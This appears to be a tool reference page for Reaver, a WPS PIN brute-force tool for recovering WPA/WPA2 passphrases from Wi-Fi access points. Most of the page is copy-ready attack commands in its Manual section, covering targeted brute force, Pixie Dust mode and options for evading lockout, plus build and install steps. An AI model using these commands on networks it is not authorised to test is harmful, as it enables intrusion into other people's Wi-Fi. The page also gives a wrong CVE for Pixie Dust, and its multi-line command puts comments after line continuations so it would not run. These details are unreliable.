# Reaver — WPS PIN Brute-Force Tool

Brute-force WPS-enabled APs to recover WPA/WPA2 passphrase by exploiting WPS PIN vulnerabilities (WPS PIN attack).

## How It Works

Targets WPS (WiFi Protected Setup) PIN authentication. Reaver enumerates the AP registrar, tries PINs sequentially (or in optimized order). On PIN validation, AP returns the full WPA PSK.

**WPS PIN structure:** 8 digits — first 4 + middle 3 + checksum (last digit). Only 11,000 possible PINs for most implementations. Average attack time: 2-8 hours.

**Limitations:** Requires WPS-enabled AP with PIN auth enabled. Many modern APs lock after 3-5 failed attempts (lockout). WPS lockout bypass available via Pixie Dust attack on some chipsets.

## Manual

```bash
# Basic attack — fixed channel, targeted BSSID
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# With Pixie Dust attack (CVE-2014-8730, Ralink/MediaTek/Broadcom)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv

# Advanced options
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF \
  --channel 6 \
  --delay 5 \              # seconds between PIN attempts
  --lock-delay 60 \         # wait after lock detected
  --max-attempts 100 \      # stop after N attempts
  --recurring-delay 3600 \  # resume delay on lock (seconds)
  --no-associate \          # skip association (if already associated)
  -N \                      # no NACK (ignore AP WPS NACK)
  -vvv                      # verbose (debug)

# Resume from session
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -s /path/to/session.wpc -vv

# Wash — scan for WPS-enabled APs
wash -i wlan0mon
```

## Build

```bash
git clone https://github.com/t6x/reaver-wps-fork-t6x.git
cd reaver-wps-fork-t6x/src
./configure
make
sudo make install
```

## Install

```bash
# Debian/Ubuntu
sudo apt install reaver

# Arch
sudo pacman -S reaver

# Kali
# Pre-installed
```

## Package

Debian/Ubuntu repos (`reaver`). Kali includes pre-installed. GitHub releases from t6x fork.

## Links

| Resource | URL |
|----------|-----|
| GitHub (t6x fork) | https://github.com/t6x/reaver-wps-fork-t6x |
| Original | https://code.google.com/archive/p/reaver-wps/ |
| Pixie Dust explanation | https://forum.hashkiller.io/index.php?threads/pixie-dust-attack.15/ |
| Wash tool | https://github.com/t6x/reaver-wps-fork-t6x |
